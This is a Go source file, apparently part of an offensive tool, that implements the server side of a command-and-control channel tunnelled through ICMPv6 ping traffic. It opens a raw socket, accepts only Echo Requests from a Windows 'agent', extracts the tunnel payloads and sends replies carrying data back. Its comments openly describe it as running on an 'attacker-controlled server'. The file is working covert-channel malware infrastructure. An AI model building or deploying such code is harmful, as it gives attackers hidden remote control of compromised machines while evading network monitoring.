//go:build linux

// Package icmpv6 provides raw-socket ICMPv6 Echo Request reception and Echo
// Reply transmission on Linux (C2 server side).
//
// The listener requires either root privileges or the CAP_NET_RAW capability
// because it opens a raw AF_INET6 socket.  On the attacker-controlled server
// this is always acceptable.
//
// Design:
//   - Read() blocks until an ICMPv6 Echo Request arrives from the agent.
//   - Reply() sends an ICMPv6 Echo Reply to the agent carrying our tunnel
//     payload. The kernel calculates the ICMPv6 checksum automatically for
//     raw sockets when using SOCK_RAW.
//   - An ICMPv6 filter is installed so the kernel delivers only type-128
//     (Echo Request) messages, discarding all other ICMPv6 traffic.
package icmpv6

import (
	"fmt"
	"net"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv6"
)

// Request holds a decoded ICMPv6 Echo Request received from the agent.
type Request struct {
	ID      int      // ICMP echo identifier (assigned by Windows ICMP API)
	Seq     int      // ICMP echo sequence number
	Payload []byte   // Tunnel frame payload carried in the echo request
	From    net.Addr // Source address of the agent
}

// Listener wraps a raw ICMPv6 socket for receiving echo requests and
// sending echo replies.
type Listener struct {
	conn *icmp.PacketConn
	p6   *ipv6.PacketConn
}

// NewListener opens a raw ICMPv6 socket bound to all interfaces (::).
// Only ICMPv6 Echo Requests are delivered to the application via a kernel
// ICMPv6 filter, reducing unnecessary wake-ups.
func NewListener() (*Listener, error) {
	conn, err := icmp.ListenPacket("ip6:ipv6-icmp", "::")
	if err != nil {
		return nil, fmt.Errorf("icmpv6 listen: %w", err)
	}

	// icmp.PacketConn already wraps an *ipv6.PacketConn internally.
	// Use the accessor rather than ipv6.NewPacketConn(conn), which would
	// panic because *icmp.PacketConn implements net.PacketConn (ReadFrom/
	// WriteTo) but NOT net.Conn (Read/Write) as required by NewPacketConn.
	p6 := conn.IPv6PacketConn()
	if p6 == nil {
		conn.Close()
		return nil, fmt.Errorf("icmpv6: IPv6PacketConn unavailable (not an IPv6 socket?)")
	}

	// Install ICMPv6 socket filter: block everything, accept Echo Request only.
	var f ipv6.ICMPFilter
	f.SetAll(true)                     // block all ICMPv6 types by default
	f.Accept(ipv6.ICMPTypeEchoRequest) // allow type 128 (Echo Request)
	if err := p6.SetICMPFilter(&f); err != nil {
		conn.Close()
		return nil, fmt.Errorf("set icmpv6 filter: %w", err)
	}

	return &Listener{conn: conn, p6: p6}, nil
}

// Close shuts down the raw socket.
func (l *Listener) Close() {
	l.conn.Close()
}

// Read blocks until an ICMPv6 Echo Request is received.
// Returns a Request containing the decoded header fields and payload.
func (l *Listener) Read() (*Request, error) {
	// 4096 bytes is more than enough; ICMPv6 payloads ≤ 1200 bytes in our protocol.
	buf := make([]byte, 4096)
	n, from, err := l.conn.ReadFrom(buf)
	if err != nil {
		return nil, fmt.Errorf("read icmpv6: %w", err)
	}

	// Protocol number 58 = IPv6-ICMP (RFC 4443)
	msg, err := icmp.ParseMessage(58, buf[:n])
	if err != nil {
		return nil, fmt.Errorf("parse icmpv6 message: %w", err)
	}
	if msg.Type != ipv6.ICMPTypeEchoRequest {
		// Should not happen due to the socket filter, but guard anyway.
		return nil, fmt.Errorf("unexpected ICMPv6 type %v (expected EchoRequest)", msg.Type)
	}

	echo, ok := msg.Body.(*icmp.Echo)
	if !ok {
		return nil, fmt.Errorf("unexpected ICMPv6 body type %T", msg.Body)
	}

	return &Request{
		ID:      echo.ID,
		Seq:     echo.Seq,
		Payload: echo.Data,
		From:    from,
	}, nil
}

// Reply sends an ICMPv6 Echo Reply to the agent.
// It uses the same ID and Seq from the original request (required for the
// Windows ICMP API to match the reply to the pending call), but substitutes
// replyPayload for the data field.
//
// replyPayload must be the same length as the request payload because
// Icmp6SendEcho2 on Windows sizes its reply buffer to match the request.
func (l *Listener) Reply(req *Request, replyPayload []byte) error {
	msg := icmp.Message{
		Type: ipv6.ICMPTypeEchoReply,
		Code: 0,
		Body: &icmp.Echo{
			ID:   req.ID,
			Seq:  req.Seq,
			Data: replyPayload,
		},
	}

	// nil pseudo-header: the kernel computes the checksum for raw IPv6 sockets.
	b, err := msg.Marshal(nil)
	if err != nil {
		return fmt.Errorf("marshal icmpv6 reply: %w", err)
	}

	_, err = l.conn.WriteTo(b, req.From)
	if err != nil {
		return fmt.Errorf("write icmpv6 reply: %w", err)
	}
	return nil
}
